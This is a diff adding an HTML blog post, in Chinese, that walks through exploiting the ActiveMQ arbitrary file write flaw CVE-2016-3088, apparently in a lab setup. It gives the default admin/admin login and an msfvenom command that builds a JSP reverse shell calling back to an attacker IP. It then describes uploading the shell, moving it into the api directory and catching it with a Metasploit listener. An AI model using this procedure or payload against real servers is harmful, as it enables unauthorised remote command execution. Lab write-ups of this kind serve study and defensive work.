@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    ActiveMQ 任意文件写入漏洞（CVE-2016-3088） |
+    
+    Hexo</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/css/technology.css">
+  
+    <link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+  
+  <script src="/js/pace.min.js"></script>
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <section class="outer">
+  <article id="post-ActiveMQ 任意文件写入漏洞" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      ActiveMQ 任意文件写入漏洞（CVE-2016-3088）
+    </h1>
+  
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2019/07/21/ActiveMQ 任意文件写入漏洞/" class="article-date">
+  <time datetime="2019-07-21T15:47:12.585Z" itemprop="datePublished">2019-07-21</time>
+</a>
+        
+      </div>
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+      
+
+      
+        <h1 id="写-shell-的话，需要写在-admin-或者-api-中，也就是需要登录，没有密码的话完成不了写-shell-操作。"><a href="#写-shell-的话，需要写在-admin-或者-api-中，也就是需要登录，没有密码的话完成不了写-shell-操作。" class="headerlink" title="写 shell 的话，需要写在 admin 或者 api 中，也就是需要登录，没有密码的话完成不了写 shell 操作。"></a>写 shell 的话，需要写在 admin 或者 api 中，也就是需要登录，没有密码的话完成不了写 shell 操作。</h1><p>该环境默认的口令为 admin/admin。<br>访问 <a href="http://127.0.0.1:8161/admin/test/systemProperties.jsp" target="_blank" rel="noopener">http://127.0.0.1:8161/admin/test/systemProperties.jsp</a></p>
+<p>2.上传 jsp 小马，返回204，但是在 fileserver 路径下不解析<br>本人用msf生成的<br>msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.199.117 lport=9999 R &gt;shell.jsp<br><img src="https://note.youdao.com/yws/public/resource/72e8278a4c032cd3c398747fc259aea7/xmlnote/WEBRESOURCEc1747bd09501fe6c6ad3c603dd5205d2/2270" alt><br>访问这个网址，用burp拦截<br><img src="https://note.youdao.com/yws/public/resource/72e8278a4c032cd3c398747fc259aea7/xmlnote/WEBRESOURCEf3c5994bdb43d3ced6a976f12418e198/2274" alt></p>
+<p>##把生成的木马内容放到拦截的内容下，上传成功会显示204（如图）<br><img src="https://note.youdao.com/yws/public/resource/72e8278a4c032cd3c398747fc259aea7/xmlnote/WEBRESOURCE0422ecb72d9421c7f700901ec9dcf536/2276" alt><br><img src="https://note.youdao.com/yws/public/resource/72e8278a4c032cd3c398747fc259aea7/xmlnote/WEBRESOURCE5c05bffec4cd398fb4bf4a6e79fd7685/2278" alt><br>然后访问如图IP，看成功没<br><img src="https://note.youdao.com/yws/public/resource/72e8278a4c032cd3c398747fc259aea7/xmlnote/WEBRESOURCEe8b7be6547292b939ed20be9532ce582/2285" alt><br>然后移动到 api 目录下，成功的话，返回 204 No Content<br><img src="https://note.youdao.com/yws/public/resource/72e8278a4c032cd3c398747fc259aea7/xmlnote/WEBRESOURCE7315ff8b1c6337e60bc7e9fddc6949d6/2293" alt><br>添加监听模块和payload<br><img src="https://note.youdao.com/yws/public/resource/72e8278a4c032cd3c398747fc259aea7/xmlnote/WEBRESOURCE27335b12cedd7f9bc62121c299cc37a2/2296" alt><br>添加端口和自己IP<br><img src="https://note.youdao.com/yws/public/resource/72e8278a4c032cd3c398747fc259aea7/xmlnote/WEBRESOURCEe5aaea27a2e1bc49ff2e56189dd52854/2299" alt><br>开始监听，可以输入命令就成功<br><img src="https://note.youdao.com/yws/public/resource/72e8278a4c032cd3c398747fc259aea7/xmlnote/WEBRESOURCEf306a57f0d3f3753ba19c604d498d576/2302" alt></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/07/21/ActiveMQ 任意文件写入漏洞/" data-id="cjyd5iwb70004gov6dpl7g8eh"
+         class="article-share-link">分享</a>
+      
+    </footer>
+
+  </div>
+
+  
+    
+  <nav class="article-nav">
+    
+    
+      <a href="/2019/07/21/-untitled 2/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">Activemq反序列化漏洞</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+    
+  
+
+</article>
+
+
+
+</section>
+    </div>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/lazyload.min.js"></script>
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  <script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/technology.js"></script>
+
+  </div>
+</body>
+</html>
